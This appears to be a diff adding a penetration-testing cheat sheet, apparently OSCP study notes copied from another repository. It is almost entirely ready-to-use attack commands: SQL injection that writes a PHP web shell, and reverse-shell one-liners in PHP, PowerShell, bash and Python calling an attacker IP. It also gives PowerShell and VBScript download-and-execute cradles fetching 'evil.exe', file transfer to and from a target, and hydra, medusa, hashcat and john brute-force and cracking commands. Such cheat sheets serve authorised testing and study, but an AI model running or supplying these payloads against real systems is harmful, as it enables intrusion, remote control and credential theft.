@@ -1,0 +1,227 @@
+======================
+Interactive TTY Shell
+======================
+# python
+python -c 'import pty; pty.spawn("/bin/sh")'
+#for python3
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
+
+stty raw –echo
+export SHELL=bash
+export TERM=xterm256-color
+
+# Echo
+echo 'os.system('/bin/bash')'
+# sh
+/bin/sh -i
+# bash
+/bin/bash -i
+
+
+========================
+Shell from SQL Injection
+========================
+# windows
+?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+# linux
+?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+
+==========
+Rev Shell
+==========
+#PHP
+<?php system($_GET["cmd"]); ?>
+<?php echo shell_exec($_GET["cmd"]); ?>
+php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+
+#Powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+#bash
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+#Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+
+vi: :!bash
+vi: :set shell=/bin/bash:shell
+nmap: !sh
+mysql: ! bash
+
+
+#msfvenom
+https://book.hacktricks.xyz/shells/shells
+==============
+File Transfer 
+==============
+Interesting Link:https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
+
+
+# Windows
+
+# Powershell download a file
+powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+
+#Windows Wget.ps1
+
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
+echo $file = "powerup.ps1" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+
+#Windows Wget.vbs and cscript
+
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> 
+wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> 
+wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+
+
+C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+
+
+#FTP (pyftpdlib client on Kali)
+# Ftp is generally installed on Windows machines
+# To make it interactive, use -s option
+
+# On Kali install a ftp client and set a username/password
+apt-get install python-pyftpdlib  
+python -m pyftpdlib -p 21
+
+# on Windows
+ftp <attackerip>
+> binary
+> get exploit.exe
+
+
+
+Python SimpleHTTPServer
+
+#on Attacker
+python -m SimpleHTTPServer
+
+#on target
+wget <attackerip>:8000/filename
+
+
+------------------------------
+
+Apache
+
+#on Attacker
+cp filetosend.txt /var/www/html
+service apache2 start
+
+#on target
+wget http://attackerip/file
+curl http://attackerip/file > file
+fetch http://attackerip/file        # on BSD
+
+----------------------------------
+
+Netcat (From Target to Kali)
+
+# Listen on Kali
+nc -lvp 4444 > file
+
+# Send from Target machine
+nc <kali_ip> 4444 < file
+
+
+========
+Cracking
+========
+
+Cewl
+cewl http://<targetip>/ -m 6 -w cewl.txt
+wc -l cewl.txt
+john --wordlist=cewl.txt --rules --stdout > mutated.txt
+wc mutated.txt
+medusa -h <targetip> -u admin -P mutated.txt -M http -n 80 -m DIR:/directory/to/login/panel -T 30
+
+-----------------------------------
+
+Hydra
+
+hydra -l root -P /usr/share/wordlısts/rockyou.txt <targetip> ssh
+hydra -L userlist.txt -P /usr/share/wordlısts/rockyou.txt <targetip> -s 22 ssh -V
+
+# crack web passwords
+http-post-form can change as user module changes
+Invalid: what message does the page give for wrong creds
+for parameters check with burp
+
+hydra -l admin -P /usr/share/seclists/Passwords/10k_most_common.txt <targetip> http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 
+
+-----------------------------------
+
+Medusa
+medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
+
+-----------------------------------
+
+Hashcat
+
+# learn the hash type from hashcat.net example hashes page and pass as its m value
+# or you can learn with the following command
+hashcat -h | grep -i lm
+hashcat -m 1600 hashes /usr/share/wordlists/rockyou.txt
+
+-----------------------------------
+
+LM/NTLM
+hashcat -h | grep -i lm 
+hashcat -m 3000  hashes --rules --wordlist=/usr/share/wordlists/rockyou.txt
+
+https://hashkiller.co.uk/
+
+------------------------------------------
+
+When you find some digits, check if it's 32 bit
+echo -n ....... | wc -c
+
+------------------------------------------
+John
+john hashes.txt --rules --wordlist=/usr/share/wordlists/rockyou.txt 
+
+
+
+##############################################################################
+Most of the stuff is just copy pasted from: https://github.com/areyou1or0/OSCP
+##############################################################################
